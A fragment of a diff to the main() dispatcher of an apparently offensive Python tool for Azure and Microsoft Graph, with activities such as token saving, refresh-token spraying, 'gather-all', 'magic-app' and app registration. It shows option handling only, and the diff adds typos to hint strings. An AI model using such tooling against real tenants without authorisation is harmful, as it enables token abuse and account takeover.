         app.redirect_to_file()
 
     if not args.headers == None:
-        print(f"{app.w('Action')}Parsing custom HTTP headers.")
+        print(f"{app.w("Action")}Parsing custom HTTP headers.")
         app.parse_headers(args.headers)
 
     if args.debug:
         app.debug_mode = True
-        print(f"{app.w('Action')}Debug mode is ON.")
+        print(f"{app.w("Action")}Debug mode is ON.")
 
     if args.verbose_debug:
         app.verbose_debug_mode = True
-        print(f"{app.w('Action')}Verbose debug mode is ON.")
+        print(f"{app.w("Action")}Verbose debug mode is ON.")
 
     if args.beta:
         app.use_beta = True
-        print(f"{app.w('Action')}Using beta API is ON.")
+        print(f"{app.w("Action")}Using beta API is ON.")
 
     if args.expand:
         app.format_print_extended = True
@@ -889,14 +894,14 @@ def main():
 
     if args.save:
         if args.name == None:
-            print(f"{app.w('Error')}Autosave requires the -n/--name option to be set.")
+            print(f"{app.w("Error")}Autosave requires the -n/--name option to be set.")
             exit()
         app.autosave = True
         app.autosave_username = args.name
 
     if args.check_privileges:
         app.check_privileges = True
-        print(f"{app.w('Action')}Permission check is ON.")
+        print(f"{app.w("Action")}Permission check is ON.")
 
     if args.activity == "save":
         token = app.is_args_set(args, "access_token")
@@ -904,7 +909,7 @@ def main():
         tenant = app.is_args_set(args, "tenant_id", False)
         refresh_token = app.is_args_set(args, "refresh_token", False)
         app.save_azure_token_to_file(token, refresh_token, tenant, name)
-        print(f"{app.w('Action')}Access token '{name}' saved.")
+        print(f"{app.w("Action")}Access token '{name}' saved.")
 
     elif args.activity == "list-token":
         app.list_saved_token()
@@ -944,7 +949,10 @@ def main():
 
     elif args.activity == "auth-app":
         tenant = app.is_args_set(args, "tenant_id")
-        app.auth_app(tenant)
+        client = app.is_args_set(args, "appid", False)
+        if client == None:
+            client = "8545b2fc-a69c-4851-9206-0f74a519fe5f"
+        app.auth_app(tenant, client)
 
     elif args.activity == "auth-interactive":
         app.autosave = True
@@ -979,7 +987,7 @@ def main():
         app.graph_self(token)
 
     elif args.activity == "permission":
-        app.print_hint(["Extend the token to Microsoft Azure CLI (04b07795-8ddb-461a-bbee-02f9e1bf7b46)"])
+        app.print_hint(["Extend the to token to Microsoft Azure CLI (04b07795-8ddb-461a-bbee-02f9e1bf7b46)"])
         token = app.is_args_set(args, "load_access_token", False)
         if not token == None:
             token = app.get_azure_token_from_file(token, "access_token")
@@ -1030,13 +1038,14 @@ def main():
 
     elif args.activity == "register-app":
         name = app.is_args_set(args, "name")
+        url = app.is_args_set(args, "url")
         token = app.is_args_set(args, "load_access_token", False)
         if not token == None:
             token = app.get_azure_token_from_file(token, "access_token")
         else:
             token = app.is_args_set(args, "access_token")
 
-        app.graph_register_app(token, name)
+        app.graph_register_app(token, name, url)
 
     elif args.activity == "add-group":
         uid = app.is_args_set(args, "uid")
@@ -1091,7 +1100,7 @@ def main():
         app.graph_spray_refresh(refresh_token, tenant, version, filepath)
 
     elif args.activity == "gather-all":
-        app.print_hint(["Extend the token to Microsoft Azure CLI (04b07795-8ddb-461a-bbee-02f9e1bf7b46)"])
+        app.print_hint(["Extend the to token to Microsoft Azure CLI (04b07795-8ddb-461a-bbee-02f9e1bf7b46)"])
         filename = app.is_args_set(args, "json", False)
         token = app.is_args_set(args, "load_access_token", False)
         if not token == None:
@@ -1102,7 +1111,7 @@ def main():
         app.graph_gather_all(token, filename)
 
     elif args.activity == "raw-url":
-        app.print_hint(["Querying the user beta endpoint returns on-prem information https://graph.microsoft.com/beta/users"])
+        app.print_hint(["Querying user beta endpoint return on-prem information https://graph.microsoft.com/beta/users"])
         filename = app.is_args_set(args, "json", False)
         url = app.is_args_set(args, "url")
         token = app.is_args_set(args, "load_access_token", False)
@@ -1125,7 +1134,7 @@ def main():
         app.graph_invite_user(token, username, url)
 
     elif args.activity == "magic-app":
-        app.print_hint(["Extend the token to Microsoft Azure CLI (04b07795-8ddb-461a-bbee-02f9e1bf7b46)"])
+        app.print_hint(["Extend the to token to Microsoft Azure CLI (04b07795-8ddb-461a-bbee-02f9e1bf7b46)"])
         token = app.is_args_set(args, "load_access_token", False)
         if not token == None:
             token = app.get_azure_token_from_file(token, "access_token")
@@ -1144,7 +1153,8 @@ def main():
         app.get_known_ids()
 
     else:
-        print(f"{app.w('Error')}Invalid activity provided.")
+        print(f"{app.w("Error")}Invalid activity provided.")
+
 
 if __name__ == "__main__":
     main()
